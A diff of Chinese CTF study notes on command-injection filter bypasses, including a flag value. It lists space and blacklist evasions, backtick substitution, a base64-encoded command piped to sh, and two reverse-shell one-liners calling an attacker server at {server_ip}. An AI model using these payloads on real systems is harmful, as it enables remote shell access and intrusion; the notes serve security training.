@@ -40,10 +40,18 @@ n1book{6fa82809179d7f19c67259aa285a7729}
 1. cmd可以会过滤空格，可以用其他字符绕过
 - %09、%0b、%0c、$IFS$9  
 2. 黑名单绕过  
-- 字符串拼接，`a=c;b=at;c=he;d=llo;$a$b ${c}${d}`为cat hello
+- 字符串拼接，`a=c;b=at;c=ag;d=fl;$a$b ${d}${c}`或`a=c;b=at;c=ag;d=fl;$a$b $d$c`为cat flag
 - 字符串截取，substr
 3. `nc、curl`命令的使用，`>、|`重定向符的使用
 4. 常用反弹shell
 - 攻击者服务器监听8888端口，nc -lvp 8888
 - 受害者1 `bash -i >& /dev/tcp/{server_ip}/8888 0>&1`
 - 受害者2 `nc -e /bin/sh {server_ip} 8888`
+5. 将反引号内命令的输出作为输入执行
+```
+cat$IFS$9`ls`
+```
+6. 过滤bash用sh执行,base64解码，`cat flag.php`为`Y2F0IGZsYWcucGhw`
+```
+echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
+```
